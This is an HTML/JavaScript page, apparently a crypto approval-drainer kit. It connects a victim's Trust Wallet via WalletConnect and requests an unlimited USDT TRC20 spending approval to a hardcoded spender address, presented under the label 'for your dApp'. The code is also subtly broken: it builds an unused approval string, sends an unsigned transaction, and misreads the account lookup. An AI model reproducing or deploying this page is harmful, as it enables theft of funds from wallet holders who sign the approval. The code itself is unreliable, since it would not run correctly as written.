<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tron USDT Approver</title>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
    <style>
        body { font-family: Arial, sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; text-align: center; }
        button { background: #007bff; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 8px; cursor: pointer; width: 100%; margin: 10px 0; }
        button:hover { background: #0056b3; }
        button:disabled { background: #ccc; cursor: not-allowed; }
        .status { margin: 20px 0; padding: 10px; border-radius: 5px; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .info { background: #d1ecf1; color: #0c5460; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
    </style>
</head>
<body>
    <h2>🚀 Tron USDT Unlimited Approval</h2>
    
    <div id="status" class="status info">Ready to connect Trust Wallet</div>
    
    <!-- Replace with your WalletConnect Project ID -->
    <input type="text" id="projectId" placeholder="Enter your WalletConnect Project ID" value="171db6da15a54effc1b4a06f889a3c3f">
    <input type="text" id="spenderAddress" placeholder="Spender Contract Address" value="TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV">
    
    <button id="connectBtn">🔗 Connect Trust Wallet</button>
    <button id="approveBtn" disabled>✅ Approve Unlimited USDT</button>
    
    <div id="connectedWallet"></div>
    <div id="txStatus"></div>

    <script>
        // USDT TRC20 Mainnet Contract
        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        const PROJECT_ID = document.getElementById('projectId').value;
        const SPENDER_ADDRESS = document.getElementById('spenderAddress');
        
        let tronWeb = null;
        let provider = null;
        let isConnected = false;

        // Initialize WalletConnect Provider (same as Tronscan)
        async function initWalletConnect() {
            provider = new WalletConnectProvider({
                rpc: {
                    728126428: "https://api.trongrid.io",
                },
                qrcode: true,
                projectId: PROJECT_ID,
                metadata: {
                    name: "USDT Approver",
                    description: "Approve unlimited USDT for your dApp",
                    url: window.location.href,
                    icons: [window.location.origin + '/icon.png']
                }
            });

            await provider.enable();
            
            tronWeb = new TronWeb({
                fullHost: 'https://api.trongrid.io',
                headers: { "TRON-PRO-API-KEY": "" },
                privateKey: null,
                providers: {
                    _web: provider
                }
            });
        }

        // Connect wallet (exact Tronscan flow)
        document.getElementById('connectBtn').onclick = async () => {
            try {
                document.getElementById('status').textContent = 'Connecting to Trust Wallet...';
                document.getElementById('status').className = 'status info';
                
                await initWalletConnect();
                
                const address = await tronWeb.trx.getAccount();
                if (address && address.base58) {
                    isConnected = true;
                    document.getElementById('connectedWallet').innerHTML = 
                        `<strong>Connected:</strong> ${address.base58}`;
                    document.getElementById('connectBtn').disabled = true;
                    document.getElementById('approveBtn').disabled = false;
                    document.getElementById('status').innerHTML = '✅ Wallet connected successfully!<br>Ready to approve unlimited USDT';
                    document.getElementById('status').className = 'status success';
                }
            } catch (error) {
                document.getElementById('status').innerHTML = `❌ Connection failed: ${error.message}`;
                document.getElementById('status').className = 'status error';
            }
        };

        // Approve unlimited USDT (exact Tronscan transaction format)
        document.getElementById('approveBtn').onclick = async () => {
            try {
                const spender = SPENDER_ADDRESS.value.trim();
                if (!spender || !TronWeb.isAddress(spender)) {
                    throw new Error('Invalid spender address');
                }

                document.getElementById('status').textContent = 'Building USDT approval transaction...';
                
                // USDT approve function signature
                const approveData = '0000000000000000000000000000000000000000' + 
                                  spender.slice(2).toLowerCase() + 
                                  '0000000000000000000000000000000000' + 
                                  'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

                const contract = await tronWeb.contract().at(USDT_CONTRACT);
                
                const tx = await contract.approve(spender, '115792089237316195423570985008687907853269984665640564039457584007913129639935').build();
                
                document.getElementById('status').textContent = 'Sending approval transaction...';
                
                const signedTx = await tronWeb.trx.sendRawTransaction(tx);
                
                if (signedTx.result) {
                    document.getElementById('txStatus').innerHTML = `
                        <div class="status success">
                            ✅ <strong>APPROVAL SUCCESSFUL!</strong><br>
                            <a href="https://tronscan.org/#/transaction/${signedTx.txid}" target="_blank">View on Tronscan</a>
                        </div>
                    `;
                    document.getElementById('approveBtn').disabled = true;
                } else {
                    throw new Error('Transaction failed');
                }
                
            } catch (error) {
                document.getElementById('status').innerHTML = `❌ Approval failed: ${error.message}`;
                document.getElementById('status').className = 'status error';
            }
        };

        // Auto-detect project ID change
        document.getElementById('projectId').onchange = () => {
            resetUI();
        };

        function resetUI() {
            isConnected = false;
            document.getElementById('connectBtn').disabled = false;
            document.getElementById('approveBtn').disabled = true;
            document.getElementById('connectedWallet').innerHTML = '';
            document.getElementById('txStatus').innerHTML = '';
            document.getElementById('status').textContent = 'Ready to connect Trust Wallet';
            document.getElementById('status').className = 'status info';
        }
    </script>
</body>
</html>
